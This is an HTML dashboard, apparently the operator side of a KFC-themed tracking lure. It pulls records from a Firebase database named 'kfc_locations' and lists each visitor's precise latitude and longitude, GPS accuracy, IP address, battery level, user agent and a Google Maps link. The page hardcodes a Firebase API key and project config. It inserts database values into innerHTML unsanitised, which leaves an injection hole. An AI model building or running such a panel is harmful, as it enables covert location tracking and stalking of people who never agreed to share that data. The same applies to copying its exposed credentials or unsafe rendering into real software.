<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>KFC Panel - Live Data</title>
  <style>
    body {
      background: #0d0d0d;
      color: #fff;
      font-family: 'Courier New', monospace;
      padding: 30px;
    }
    h1 {
      color: #ffcc00;
      text-align: center;
      margin-bottom: 30px;
    }
    .card {
      border: 2px solid #ff0000;
      border-radius: 15px;
      padding: 15px;
      margin-bottom: 20px;
      background: #1a1a1a;
      box-shadow: 0 0 10px #ff0000;
    }
    .map-link {
      color: #00ccff;
      text-decoration: none;
    }
    .map-link:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>
  <h1>🔥 KFC Live Panel 🔥</h1>
  <div id="data-container"></div>

  <!-- Firebase SDK -->
  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>

  <script>
    // Replace with your own config from Firebase
  const firebaseConfig = {
  apiKey: "AIzaSyCG7XY_KjzJkfLWtUSgarDLritenEbbvSY",
  authDomain: "kfc-tracker.firebaseapp.com",
  databaseURL: "https://kfc-tracker-default-rtdb.firebaseio.com",
  projectId: "kfc-tracker",
  storageBucket: "kfc-tracker.firebasestorage.app",
  messagingSenderId: "127099679000",
  appId: "1:127099679000:web:4a4f5e66a5b99c63882e6d",
  measurementId: "G-EPEXKK3S37"
};

    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    const container = document.getElementById("data-container");

    db.ref("kfc_locations").on("child_added", (snapshot) => {
      const data = snapshot.val();
      const card = document.createElement("div");
      card.className = "card";
      card.innerHTML = `
        <strong>🕒 Time:</strong> ${data.timestamp}<br>
        <strong>📍 Latitude:</strong> ${data.lat}<br>
        <strong>📍 Longitude:</strong> ${data.lon}<br>
        <strong>🎯 Accuracy:</strong> ${data.accuracy} meters<br>
        <strong>🌐 IP Address:</strong> ${data.ip}<br>
        <strong>🔋 Battery:</strong> ${data.battery}<br>
        <strong>🧠 User Agent:</strong> ${data.userAgent}<br>
        <strong>📌 Map:</strong> <a class="map-link" target="_blank" href="${data.mapUrl}">View on Google Maps</a>
      `;
      container.prepend(card); // Latest on top
    });
  </script>
</body>
</html>
